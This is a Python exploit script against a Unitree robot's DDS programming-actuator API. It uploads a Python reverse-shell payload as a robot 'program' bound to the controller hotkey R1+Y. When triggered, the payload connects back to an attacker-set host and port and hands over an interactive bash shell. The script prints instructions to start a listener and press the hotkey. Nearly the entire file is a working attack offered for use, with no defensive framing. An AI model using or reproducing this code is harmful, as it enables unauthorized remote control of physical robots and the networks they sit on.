#!/usr/bin/env python3
import sys
import json
import os
import time
from cyclonedds.domain import DomainParticipant
from cyclonedds.topic import Topic
from cyclonedds.pub import DataWriter
from cyclonedds.sub import DataReader
from cyclonedds.core import Qos, Policy
from cyclonedds.util import duration
from unitree_sdk2py.idl.unitree_api.msg.dds_ import (
    Request_, RequestHeader_, RequestIdentity_, RequestLease_, RequestPolicy_, Response_
)

# inline DDS config 
os.environ['CYCLONEDDS_URI'] = '''<CycloneDDS>
  <Domain id="0">
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
    </General>
    <Discovery>
      <Peers>
        <Peer address="192.168.123.161"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>'''

# change this to ur machine
LHOST = "192.168.1.2"
LPORT = 4444

# rs payload
revshell_code = f"""
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{LHOST}', {LPORT}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])
"""

dp = DomainParticipant(0)

# pain in my asshole
qos = Qos(
    Policy.Reliability.BestEffort,
    Policy.Durability.Volatile,
    Policy.History.KeepLast(depth=1)
)

writer = DataWriter(dp, Topic(dp, 'rt/api/programming_actuator/request', Request_, qos=qos))
reader = DataReader(dp, Topic(dp, 'rt/api/programming_actuator/response', Response_))

time.sleep(5)

req_id = int(time.time() * 1000)

payload = {
    "program_content": {
        "chunk_index": 1,
        "total_chunk_num": 1,
        "chunk_content": revshell_code
    },
    "program_uuid": "revshell",
    "bind_hotkey": "R1+Y" 
}

req = Request_(
    header=RequestHeader_(
        identity=RequestIdentity_(id=req_id, api_id=1002),
        lease=RequestLease_(id=0),
        policy=RequestPolicy_(priority=0, noreply=False)
    ),
    parameter=json.dumps(payload),
    binary=b""
)

writer.write(req)
print(f"sent revshell payload (id={req_id})")
print(f"connects back to {LHOST}:{LPORT}")

timeout = time.time() + 5
got_response = False

while time.time() < timeout:
    samples = reader.take(10)
    for sample in samples:
        if hasattr(sample, 'header') and sample.header.identity.id == req_id:
            code = sample.header.status.code
            if code == 0:
                print("upload ok")
                print("start listener & press R1+Y on controller")
            else:
                print(f"failed: {code}")
            got_response = True
            break
    if got_response:
        break
    time.sleep(0.1)

if not got_response:
    print("no response conf file write and .txt change")
